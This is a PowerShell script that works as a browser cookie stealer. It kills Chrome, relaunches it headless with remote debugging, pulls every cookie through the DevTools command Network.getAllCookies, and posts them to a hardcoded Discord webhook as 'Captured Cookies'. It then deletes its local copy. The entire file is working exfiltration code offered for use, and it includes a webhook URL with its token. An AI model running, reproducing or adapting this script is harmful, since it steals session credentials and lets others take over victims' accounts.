# --- CONFIGURATION ---
$webhookUrl = "https://discord.com/api/webhooks/1372618531245523026/MVdECd09IUHFjbRi3GVewdwa7w-ljoqWZXjfjCUplsUxc5d5RbbboF9ueXl7UW5Qi_1Y" # Your webhook
$remoteDebuggingPort = 9222
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$outputFile = ".\Chrome-Cookies.json"

# --- FUNCTIONS ---

function Quit-Chrome {
    Write-Host "Quitting Chrome if running..."
    Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
}

function Send-Receive-WebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        Add-Type -AssemblyName System.Net.WebSockets
        $webSocket = [System.Net.WebSockets.ClientWebSocket]::new()

        Write-Host "Connecting to WebSocket: $WebSocketUrl"
        $uri = [Uri]$WebSocketUrl
        $connectTask = $webSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
        $connectTask.Wait()

        if ($webSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            Write-Error "WebSocket connection failed. State: $($webSocket.State)"
            return $null
        }

        # Send message
        $bytesToSend = [Text.Encoding]::UTF8.GetBytes($Message)
        $sendTask = $webSocket.SendAsync($bytesToSend, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None)
        $sendTask.Wait()
        Write-Host "Message sent to WebSocket."

        # Receive response
        $bufferSize = 8192
        $buffer = New-Object Byte[] $bufferSize
        $receivedBytes = New-Object System.Collections.Generic.List[Byte]

        do {
            $result = $webSocket.ReceiveAsync($buffer, [Threading.CancellationToken]::None)
            $result.Wait()
            if ($result.Result.Count -gt 0) {
                $receivedBytes.AddRange($buffer[0..($result.Result.Count -1)])
            }
        } while (-not $result.Result.EndOfMessage)

        # Close WebSocket
        $closeTask = $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [Threading.CancellationToken]::None)
        $closeTask.Wait()

        $responseString = [Text.Encoding]::UTF8.GetString($receivedBytes.ToArray())
        Write-Host "Received response from WebSocket."
        return $responseString
    } catch {
        Write-Error "WebSocket error: $_"
        return $null
    }
}

# --- MAIN SCRIPT ---

# Clean up any existing Chrome
Quit-Chrome

# Launch Chrome with remote debugging
Write-Host "Launching Chrome..."
Start-Process -FilePath $chromePath -ArgumentList "--headless", "--remote-debugging-port=$remoteDebuggingPort", "https://google.com" | Out-Null
Start-Sleep -Seconds 3

# Fetch WebSocket URL
try {
    $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
    Write-Host "Fetching Chrome debugging info..."
    $jsonResponse = Invoke-RestMethod -Uri $jsonUrl -ErrorAction Stop
} catch {
    Write-Error "Failed to get Chrome debugging info: $_"
    Quit-Chrome
    exit
}

# Extract WebSocket URL
$WebSocketUrl = $jsonResponse | Select-Object -ExpandProperty webSocketDebuggerUrl
if ([string]::IsNullOrEmpty($WebSocketUrl)) {
    Write-Error "WebSocket URL not found."
    Quit-Chrome
    exit
}
Write-Host "WebSocket URL: $WebSocketUrl"

# Send command to get cookies
$command = '{"id":1,"method":"Network.getAllCookies"}'
$responseString = Send-Receive-WebSocketMessage -WebSocketUrl $WebSocketUrl -Message $command

if ([string]::IsNullOrEmpty($responseString)) {
    Write-Error "No response received from WebSocket."
    Quit-Chrome
    exit
}

# Parse response
try {
    $responseJson = $responseString | ConvertFrom-Json
} catch {
    Write-Error "Failed to parse WebSocket response: $_"
    Quit-Chrome
    exit
}

# Extract cookies
if ($responseJson.result -and $responseJson.result.cookies) {
    $cookies = $responseJson.result.cookies
    Write-Host "Number of cookies retrieved: $($cookies.Count)"
} else {
    Write-Host "No cookies found."
    $cookies = @()
}

# Save cookies
$cookiesJson = $cookies | ConvertTo-Json -Depth 10
Set-Content -Path $outputFile -Value $cookiesJson
Write-Host "Cookies saved to $outputFile."

# Close Chrome
Write-Host "Closing Chrome..."
Quit-Chrome

# Send to Discord Webhook
if ($cookies.Count -gt 0) {
    $payload = @{
        username = "CookieBot"
        content = "Captured Cookies at $(Get-Date)"
        embeds = @(
            @{
                title = "Chrome Cookies"
                description = "```json`n$cookiesJson`n```"
                color = 5814783
            }
        )
    } | ConvertTo-Json -Depth 3

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        Write-Host "Cookies sent to Discord webhook."
    } catch {
        Write-Error "Failed to send data to webhook: $_"
    }
} else {
    Write-Host "No cookies to send."
}

# Cleanup
Remove-Item $outputFile -ErrorAction SilentlyContinue
Write-Host "Done."
